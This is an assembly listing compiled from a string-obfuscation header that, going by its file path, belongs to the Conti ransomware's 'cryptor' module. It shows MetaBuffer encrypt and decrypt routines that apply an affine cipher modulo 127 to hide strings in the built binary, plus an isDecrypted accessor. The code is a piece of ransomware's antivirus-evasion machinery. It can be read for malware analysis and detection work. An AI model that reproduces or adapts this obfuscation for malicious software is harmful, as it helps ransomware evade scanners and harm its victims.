this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6d	 imul	 r8d, eax, 109		; 0000006dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 49	 add	 r8d, 73			; 00000049H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 32 00 00 00	 mov	 ecx, 50			; 00000032H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2a	 imul	 r8d, ecx, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 40 19	 lea	 r8d, DWORD PTR [rax+25]
  00007	46 8d 04 40	 lea	 r8d, DWORD PTR [rax+r8*2]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted
_TEXT	ENDS
END
